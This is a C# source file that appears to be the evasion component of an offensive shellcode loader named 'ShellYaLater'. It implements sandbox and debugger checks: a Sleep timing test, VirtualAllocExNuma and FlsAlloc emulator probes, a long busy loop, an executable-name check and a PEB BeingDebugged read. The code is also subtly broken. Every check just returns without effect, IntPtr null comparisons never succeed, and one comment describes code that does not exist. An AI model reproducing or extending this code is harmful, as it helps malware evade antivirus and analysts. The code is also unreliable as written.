using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;


namespace ShellYaLater.Evasion_Class
{
    internal class SherryChristmas
    {
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        public static void SleepTimer()
        {
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }
        }

        //allocExNuma
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        public static void VirtualAllocExNuma()
        {

            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }
        }


        //flsalloc
        [DllImport("kernel32.dll")]
        static extern IntPtr FlsAlloc(IntPtr lpCallback);
        public static void FlsAlloc()
        {

            IntPtr result = FlsAlloc(IntPtr.Zero);
            if (result == null)
            {
                return;
            }
        }
        //iterations
        public static void ManyIterations()
        {
            int count = 0;
            int max = 900000000;
            for (int i = 0; i < max; i++)
            {
                count++;
            }
            if (count == max)
            {
                return;
            }
        }
        //file name check
        public static void FilenameCheck()
        {
            string exename = "ShellYaLater";
            if (Path.GetFileNameWithoutExtension(Environment.GetCommandLineArgs()[0]) != exename)
            {
                return;
            }
        }

        //check for AV debugger --> check if the parent process makes sense (eg. explorer)
        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }
        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess,
    int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation,
        uint ProcInfoLen, ref uint retlen);

        public static void ProcessChecker()
        {
            const int ProcessBasicInformation = 0;

            // Get a handle to the current process
            IntPtr currentProcess = Process.GetCurrentProcess().Handle;

            // Set up the structure and variables
            PROCESS_BASIC_INFORMATION procInfo = new PROCESS_BASIC_INFORMATION();
            uint retLength = 0;

            // Call ZwQueryInformationProcess
            int status = ZwQueryInformationProcess(
                currentProcess,
                ProcessBasicInformation,
                ref procInfo,
                (uint)Marshal.SizeOf(procInfo),
                ref retLength
            );

            if (status != 0) // STATUS_SUCCESS is 00
            {
                // Retrieve and return the parent process ID
                return;            
            }
            if (Marshal.ReadByte(procInfo.PebAddress, 2) != 0)
            {
                return;
            }
           
        
            
        }

    }
}
